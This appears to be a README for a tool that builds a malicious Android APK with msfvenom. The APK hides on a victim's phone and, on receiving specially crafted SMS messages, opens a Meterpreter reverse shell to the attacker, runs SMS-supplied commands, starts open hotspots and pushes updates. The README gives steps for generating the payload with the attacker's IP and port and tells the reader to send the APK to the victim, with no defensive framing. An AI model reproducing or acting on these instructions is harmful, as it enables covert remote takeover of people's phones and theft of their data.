# Sms-Triggered-Meterpreter

Create the msfvenome android payload which will be 
triggered with the special sms and send meterpreter 
shell to the atacker.
It consist of the following types features which can 
be triggerd by different sms.

1.Check - To check whether the installed payload is 
  working or not 
  (display toast message for the incoming trigger sms)
2.meterpreter-It send the meterpreter to the attacker
3.terminal-open a terminal on mobile
4.command-execute a command send in sms
5.update- Update the paylod
  ( user is prompt for installing apk )
6.hotspoton -start a hotspot
7.hotspotnull - start a open hotspot
8.hotspotoff - Turn off the hotspot

Creating custom payload:
1.Give permission and run android-sms.sh
2.select the option for
  -sms specific trigger to trigger meterpreter on 
    specific sms
  -trigger for all sms to trigger meterpreter on all sms
3.Enter the ip and port address
4.To change the triggers ,change the MainBroadcastReceiver 
  and replace corresponding values.Do not change the file 
  elsewhere.
  eg. The command to meterpreter shell will be of format 
    password      option
  goo.gl.ltRmUp +1428345602
5. Final apk will be generated named signed.apk
6.Send signed.apk to the victim and give autorun permission.
  Check and enjoy!
